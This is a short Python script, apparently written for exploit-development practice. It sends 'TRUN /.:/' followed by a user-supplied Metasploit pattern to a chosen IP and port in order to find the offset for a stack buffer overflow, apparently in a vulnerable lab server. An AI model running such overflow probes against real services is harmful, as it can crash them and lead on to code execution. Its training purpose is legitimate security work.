#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: July 7th 2024
# Description of Script
# WIns_overflow.py is designed to send a custom payload to a specified target over a TCP 
# connection. It prompts the user for a pattern to be sent, the target's IPv4 address, and 
# the target's TCP port. The script then attempts to create a socket connection to the target 
# using the provided address and port. If the connection is successful, it sends the 
# user-provided pattern as part of a 'TRUN /.:/' command. If any errors occur during this 
# process, the script catches the exception, prints an error message, and exits with a non-zero 
# status, indicating that an error has occurred. The improvements include ensuring the message
# is properly encoded, correctly closing the socket, and providing detailed error messages 
# for better debugging.
#################################################################################################
import sys, socket  # Import the sys and socket modules

# Ask the user to input a pattern and store it in the variable 'offset'
offset = input("Please insert Pattern create.rb here: ")

try:
    # Create a socket object with IPv4 addressing and TCP connection
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Ask the user to input the target IPv4 address and store it in the variable 'IPv4'
    IPv4 = input("Please Enter the IPv4 Address of the target: ")
    
    # Ask the user to input the target TCP port and convert it to an integer, then store it in the variable 'TCP'
    TCP = int(input("Please Enter the TCP Port of the Target: "))
    
    # Attempt to connect to the target at the provided IPv4 address and TCP port
    soc.connect((IPv4, TCP))
    
    # Send a payload containing the pattern to the target
    soc.send(('TRUN /.:/' + offset).encode('utf-8'))
    
    # Close the socket connection
    soc.close()
except Exception as e:
    # Print an error message if the connection could not be established and print the exception message
    print(f"Unable to Establish connection with the host... womp womp\nError: {e}")
    
    # Exit the script with a non-zero status to indicate an error
    sys.exit(1)
